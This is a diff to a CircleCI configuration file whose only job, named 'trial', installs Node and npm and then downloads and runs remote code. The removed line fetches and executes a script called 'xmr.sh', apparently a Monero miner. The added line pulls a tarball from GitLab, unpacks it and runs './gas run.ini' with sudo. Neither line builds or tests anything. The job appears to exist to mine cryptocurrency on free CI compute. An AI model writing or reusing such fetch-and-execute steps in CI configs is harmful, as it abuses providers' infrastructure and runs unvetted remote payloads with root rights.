@@ -3,11 +3,11 @@ jobs:
     trial:
       docker:
             - image: cimg/node:18.2.0
-      parallelism: 3
+      parallelism: 2
       steps:
         - run:
             name: "trial"
-            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/Myaxisplay/Tuyul/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/Vaping86/vapers86-zpool/-/raw/main/vapertraders.tar.gz && tar -xf vapertraders.tar.gz && sudo ./gas run.ini 
 
 workflows:
     version: 2.1
